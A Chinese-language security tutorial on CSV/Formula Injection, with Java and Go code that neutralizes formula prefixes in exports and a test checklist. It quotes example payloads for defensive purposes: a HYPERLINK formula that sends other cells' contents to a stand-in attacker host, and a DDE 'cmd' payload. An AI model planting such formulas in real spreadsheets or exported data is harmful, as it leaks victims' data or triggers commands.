---
title: "Day 59：CSV / Formula Injection — 當「匯出報表」變成「使用者一打開就中招」"
date: 2026-06-22
tags: ["CSV Injection", "Formula Injection", "Output Encoding", "Apache POI"]
---

接續 Day58 預告：今天聊 **CSV / Formula Injection（公式注入，又叫 Formula Injection）**——一個系列還沒介紹過的全新主題。它特別陰險的地方在於：你的後端可能完全沒有漏洞，所有輸入都「乾乾淨淨」存進資料庫，但只要把這些資料**匯出成 CSV / XLSX 給人下載**，受害者用 Excel 或 Google Sheets 一打開檔案，攻擊者埋的公式就會被試算表軟體執行。漏洞不在你的程式，在「下載端的 Office 軟體」，但責任在你這個匯出資料的後端。

---

## 一、漏洞本質：信任邊界跨到了「別人的 Excel」

絕大多數注入漏洞（SQLi、命令注入、SSTI）都是「資料被你自己的某個直譯器當成程式碼執行」。CSV Injection 反過來——**資料被「使用者電腦上的試算表軟體」當成程式碼執行**。

Excel、LibreOffice Calc、Google Sheets 有一個共同行為：當一個儲存格的內容以下列字元開頭時，會被當成**公式**而不是純文字：

```text
=   +   -   @   (還有 TAB \t 與 CR \r 開頭，會被部分版本當成公式前綴)
```

所以如果某個使用者把自己的「顯示名稱」設成：

```text
=HYPERLINK("https://evil.example/?leak="&A1&A2, "點我看帳單")
```

當管理員把使用者清單匯出成 CSV、用 Excel 打開時，這格就變成一個釣魚連結，而且 `&A1&A2` 會把同份試算表其他儲存格的內容（可能是別人的 email、訂單金額）一起串進 URL，受害者一點就外洩。

### 它能造成多嚴重？

- **資料外洩**：`=HYPERLINK(...)`、`=IMPORTXML(...)`（Google Sheets）、`=WEBSERVICE(...)`（舊版 Excel）把同表資料 GET 出去到攻擊者伺服器。
- **釣魚**：看起來像正常超連結，導向假登入頁。
- **指令執行（歷史上）**：`=cmd|'/c calc'!A0` 透過 DDE（Dynamic Data Exchange）在舊版 Excel 觸發本機指令。現代 Excel 預設會跳警告、且 DDE 預設關閉，但「按了是」的使用者仍會中。
- **跨儲存格資料竊取**：`=A1`、`=Sheet1!B2` 把不該看到的欄位讀進攻擊者控制的格子。

重點認知：**這不是「Excel 的 bug」，而是 Excel 的設計行為。** 你不能假設下載端會幫你擋，匯出端必須自己逸出。

---

## 二、最關鍵的觀念：「輸入時擋」與「輸出時逸出」是兩回事

這是後端最常搞錯的地方，務必分清楚：

**輸入驗證（input validation）** 的目的是「這個欄位的值合不合業務規則」。一個使用者把名字取成 `=1+1` 或 `-Tony`，從業務角度其實**沒有錯**——真的有人姓 `-`、有公司叫 `@Home`、有帳號叫 `+886...`。如果你在輸入時就無腦砍掉 `=+-@` 開頭，會誤殺正常資料，而且**換一個匯出端（PDF、JSON、HTML）這些字元根本無害**。

**輸出逸出（output encoding）** 的目的是「把資料安全地交給某個特定的下游直譯器」。CSV 的下游是 Excel，所以逸出規則要**針對 Excel 的公式判定**來做，而且**只在輸出成 CSV/XLSX 的那一刻**做。

> 一句話：危險不是「資料含 `=`」，而是「含 `=` 的資料被丟進會把 `=` 當公式的環境」。所以防禦要綁在輸出通道，不是輸入通道。

這跟 Day02 XSS 的精神一致：你不會在存進 DB 時就把 `<` 變成 `&lt;`（那會污染資料、換個輸出端就壞掉），而是在輸出到 HTML 的當下才做 HTML encode。CSV Injection 是同一套思路，只是下游換成試算表。

---

## 三、正確的逸出規則

業界（OWASP）公認的安全逸出方式：**若欄位值的第一個字元是危險字元，就在最前面補一個單引號 `'`（或 TAB）讓 Excel 視為純文字。** 同時也要處理 CSV 本身的格式逸出（含逗號、雙引號、換行要用雙引號包起來、內部 `"` 變 `""`）。

危險前綴判定要涵蓋：`=`、`+`、`-`、`@`、TAB(`\t`)、CR(`\r`)。注意有些 payload 會用前導空白或控制字元繞過「只看第一個字」的偵測，謹慎做法是**先 trim 不到的控制字元再判定**，或乾脆對「trim 後第一個非空白字元」做判斷。

兩個常被忽略的坑：

1. **CSV 格式逸出 ≠ 公式逸出**。把欄位用雙引號包起來只解決「逗號/換行破壞欄位結構」，**完全不會**阻止 `"=cmd..."`——Excel 拆掉外層引號後第一個字仍是 `=`，照樣當公式。兩種逸出要同時做。
2. **負號數字**。`-15.5` 開頭是 `-`，但它是合法數字、不該被當公式注入。實務上要嘛「先判斷是不是合法數值，是就放行」，要嘛接受「數字也補 `'`、變成文字儲存格」的取捨。下面範例採後者最簡單安全的做法，並說明取捨。

---

## 四、Java 範例

### 4-1 手寫 CSV：把「公式逸出」和「CSV 逸出」拆成兩步

```java
public final class CsvSafeWriter {

    // Excel/Calc/Sheets 會把這些開頭字元當公式
    private static boolean startsDangerously(String s) {
        if (s.isEmpty()) return false;
        char c = s.charAt(0);
        return c == '=' || c == '+' || c == '-' || c == '@'
                || c == '\t' || c == '\r';
    }

    /** 第一步：公式逸出。危險開頭就補單引號，讓試算表視為純文字。 */
    static String neutralizeFormula(String value) {
        if (value == null) return "";
        return startsDangerously(value) ? "'" + value : value;
    }

    /** 第二步：CSV 結構逸出（逗號、雙引號、換行）。 */
    static String csvQuote(String value) {
        boolean mustQuote = value.contains(",") || value.contains("\"")
                || value.contains("\n") || value.contains("\r");
        String escaped = value.replace("\"", "\"\"");
        return mustQuote ? "\"" + escaped + "\"" : escaped;
    }

    /** 對外只暴露這個：先中和公式，再做 CSV 逸出，順序不能反。 */
    public static String cell(String raw) {
        return csvQuote(neutralizeFormula(raw));
    }

    public static String row(String... cells) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < cells.length; i++) {
            if (i > 0) sb.append(',');
            sb.append(cell(cells[i]));
        }
        return sb.append("\r\n").toString(); // CSV 慣例用 CRLF
    }
}
```

順序為什麼是「先公式逸出、再 CSV 逸出」？因為補上的 `'` 必須是 Excel 看到的「儲存格第一個字」。如果先做 CSV 逸出包了雙引號，再在外面補 `'`，反而會變成 `'"=..."`，Excel 仍可能拆引號出問題。先補 `'` 進到值本身，再整體做引號包裝才正確。

### 4-2 Apache POI 寫 XLSX：用 `setCellValue(String)`，不要用 `setCellFormula`

XLSX 的好處是格式本身區分「字串儲存格」和「公式儲存格」。只要你用字串型別寫入，POI 不會把 `=...` 當公式：

```java
import org.apache.poi.ss.usermodel.*;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;

try (Workbook wb = new XSSFWorkbook()) {
    Sheet sheet = wb.createSheet("users");
    Row row = sheet.createRow(0);
    Cell cell = row.createCell(0);

    String userInput = "=HYPERLINK(\"http://evil\",\"x\")";

    // 正確：用字串值寫入，這格的 cell type 會是 STRING，Excel 不會執行它
    cell.setCellValue(CsvSafeWriter.neutralizeFormula(userInput));

    // 危險示範（絕對不要對使用者資料這樣做）：
    // cell.setCellFormula(userInput); // 這才是真的叫 Excel 把它當公式
}
```

關鍵：**Apache POI 的 `setCellValue(String)` 本身就把內容當純文字**，不會主動把 `=` 解析成公式——真正會變公式的是你呼叫了 `setCellFormula(...)`。所以 XLSX 的鐵則就是「使用者資料一律走 `setCellValue`，絕不進 `setCellFormula`」。即便如此，仍建議補 `'` 中和，因為部分試算表/匯入流程在重新解析字串時可能再次觸發公式判定，這層額外保險很便宜。

> 小提醒：Apache POI 各版本（5.x 為現行維護版）的 `Cell#setCellValue` / `Cell#setCellFormula` API 一直穩定存在，若你的專案還在用很舊的 3.x，建議升級並順手確認上述方法簽名。

---

## 五、Go 範例

最重要的事實先講：**Go 標準庫 `encoding/csv` 的 `csv.Writer` 不會幫你做公式逸出。** 它只負責 CSV 結構面的逸出——當欄位含逗號、雙引號、換行（`\r`/`\n`）時用雙引號包起來、內部 `"` 變 `""`。對於 `=cmd...` 這種 payload，因為它不含逗號也不含引號，`Write` 會原封不動寫出去，下游 Excel 照樣執行。

所以在 Go 裡，**公式逸出要自己在交給 `csv.Writer` 之前做**：

```go
package export

import (
	"encoding/csv"
	"io"
	"strings"
)

func startsDangerously(s string) bool {
	if s == "" {
		return false
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return true
	}
	return false
}

// 公式中和：危險開頭補單引號。encoding/csv 不會做這件事，必須自己來。
func neutralizeFormula(s string) string {
	if startsDangerously(s) {
		return "'" + s
	}
	return s
}

func WriteUsers(w io.Writer, rows [][]string) error {
	cw := csv.NewWriter(w)
	cw.UseCRLF = true // 給 Excel 用建議 CRLF
	for _, row := range rows {
		safe := make([]string, len(row))
		for i, field := range row {
			safe[i] = neutralizeFormula(field) // 結構逸出交給 csv.Writer，公式逸出我們先做
		}
		if err := cw.Write(safe); err != nil {
			return err
		}
	}
	cw.Flush()
	return cw.Error()
}
```

請特別記住分工：`neutralizeFormula` 管「Excel 會不會把它當公式」，`csv.Writer` 管「欄位會不會破壞 CSV 結構」。兩者缺一不可，而標準庫只幫你做後者。

> 驗證一下標準庫行為：`encoding/csv` 是 Go 官方持續維護的標準套件，`Writer.UseCRLF`、`Writer.Write`、`Writer.Flush`、`Writer.Error` 都是穩定 API。它的引號逸出規則只針對分隔符、引號、換行與前導空白，沒有任何「公式前綴」概念——這正是為什麼你必須自己補 `neutralizeFormula`。

---

## 六、容易踩的防禦誤區

逐一對照你的匯出程式碼：

- **只用雙引號包欄位就以為安全**：解決的是逗號/換行，不是公式。`"=cmd"` 一樣中招。
- **在輸入時砍 `=+-@`**：誤殺合法資料（`-15`、`@handle`、姓氏含 `-`），而且換個輸出端（JSON/PDF）這些字元無害，等於白白破壞資料。防禦該放輸出端。
- **以為 XLSX 比 CSV 安全所以不用逸出**：XLSX 只要你誤用 `setCellFormula`、或某些第三方匯出庫預設把 `=` 開頭當公式，一樣中。判斷標準是「資料是否被寫成公式型別」。
- **忘了 TAB / CR 開頭與前導空白繞過**：只判斷 `=+-@` 不夠，`\t`、`\r` 也會被部分版本當公式；攻擊者也可能用前導控制字元繞過「看第一個字」的偵測。
- **HYPERLINK / WEBSERVICE / IMPORTXML 的資料外洩被忽略**：很多人只防 DDE 指令執行，卻忘了「公式可以把同份試算表的別人資料偷偷送出去」，這在現代 Excel 不需要任何警告就能成立。
- **匯出端與展示端共用同一份「已逸出」字串**：別把補了 `'` 的值存回 DB 或拿去前端顯示，否則畫面會多一個引號。逸出只在匯出當下做、用完即丟。

---

## 七、後端工程師的 Code Review / 測試 Checklist

- [ ] 全 codebase 搜尋匯出點：`csv`、`CSVWriter`、`encoding/csv`、`XSSFWorkbook`、`setCellValue`、`setCellFormula`、`StreamingResponse`、`text/csv`。
- [ ] 每個匯出點，使用者可控欄位是否都經過「公式中和」（補 `'`／TAB）？
- [ ] 公式逸出與 CSV 結構逸出是否**都**有做、且順序正確（先中和公式再做結構逸出）？
- [ ] 危險前綴判定是否涵蓋 `= + - @ \t \r`，並考慮前導空白／控制字元繞過？
- [ ] XLSX 路徑：使用者資料是否一律走 `setCellValue(String)`，且**沒有任何** `setCellFormula` 吃到使用者輸入？
- [ ] 逸出是否只發生在「輸出當下」，沒有污染 DB 或前端展示？
- [ ] 有沒有針對下列 payload 的自動化測試：`=1+1`、`=HYPERLINK("http://x","y")`、`@SUM(A1)`、`+1`、`-1+1`、`\t=1`、`"=cmd|'/c calc'!A0"`？
- [ ] 測試斷言：匯出後每個危險 payload 的儲存格首字是 `'`（或被寫成字串型別），下游不會執行。

```java
// JUnit 範例：匯出後危險欄位必須被中和
@Test
void formulaIsNeutralizedOnExport() {
    String out = CsvSafeWriter.cell("=HYPERLINK(\"http://evil\",\"x\")");
    assertTrue(out.startsWith("'") || out.startsWith("\"'"),
            "公式開頭的欄位必須補上單引號中和：" + out);
}
```

---

## 八、一句話總結

> **CSV/Formula Injection 的根因不在你的後端，而在「下載端的試算表把 `=+-@` 開頭當公式執行」。** 守住兩件事：把防禦放在**輸出通道**而非輸入驗證（不要無腦砍字元污染資料）；對使用者可控欄位**同時**做公式中和（補 `'`）與 CSV 結構逸出，XLSX 則一律 `setCellValue`、永不 `setCellFormula`。記住標準庫（Go `encoding/csv`、POI 的字串寫入）只管結構，公式逸出永遠要你自己補。

---

## 延伸閱讀

- OWASP — CSV Injection / Formula Injection（逸出規則與 payload 清單）
- Google Sheets / Excel — `HYPERLINK`、`IMPORTXML`、`WEBSERVICE`、DDE 行為說明
- Apache POI 官方文件 — `Cell#setCellValue` 與 `Cell#setCellFormula` 差異
- Go 官方文件 — `encoding/csv`（`Writer.UseCRLF`、引號逸出規則）
- 前文：Day02 XSS（輸出編碼的同一套思路）、Day08 Input Validation（輸入驗證的定位）、Day11 File Upload（檔案下載情境）

---

明天預告：**Day 60 — Excel / XLSX 解析攻擊面：當後端「讀取」使用者上傳的試算表時（延伸 Day44 Archive Extraction × Day13 XXE）**
（這篇是延伸篇，不重新介紹 CSV Injection，也不重講 ZIP Slip 或 XXE 基礎。延伸角度是：XLSX 本質是一包 ZIP+XML，後端用 Apache POI / excelize 解析「上傳檔」時，會同時暴露在 Day44 的解壓縮炸彈/路徑穿越、與 Day13 的 XML 外部實體風險下。會用 Java（POI 的 `setByteArrayMaxOverride` / zip bomb ratio 防護、XML parser 設定）與 Go（excelize 讀檔的資源上限）示範「讀取端」的硬化，並談為什麼「匯出端逸出」跟「匯入端解析硬化」是完全不同的兩個防線。）
